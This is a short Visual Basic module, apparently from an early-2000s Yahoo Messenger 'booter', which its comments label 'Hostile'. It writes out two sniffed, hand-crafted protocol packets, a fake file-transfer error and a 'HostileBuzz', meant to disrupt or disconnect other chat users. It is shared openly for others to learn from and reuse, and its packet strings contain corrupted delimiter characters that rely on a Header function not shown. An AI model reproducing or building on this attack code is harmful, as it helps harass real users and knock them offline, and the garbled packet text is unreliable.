Attribute VB_Name = "Module1"
'Source To A Booter - Hostile
'Well i sniffed these 2 packets my self so if you use them give me credit plz where it is needed
'Don't be lame and just change the colors of this example or w/e this shit is to learn from
'www.Yahoo-Terrorists.com
'www.Leet-Programmers.com
'www.The-Source.org
Public Function Error(WhoFrom As String, WhoTo As String) As String
Dim Pck As String
Pck = "5��" & WhoTo & "��49��FILEXFER��1��" & WhoFrom & "��13��5��54��MSG1.0��"
Error = Header("4D", Pck)
Debug.Print Error
End Function
Public Function HostileBuzz(WhoFrom As String, WhoTo As String) As String
Pck = "1��" & WhoFrom & "��5��" & WhoTo & "++" & "��14��<ding>��97��1��"
HostileBuzz = Header("06", Pck)
Debug.Print HostileBuzz
End Function
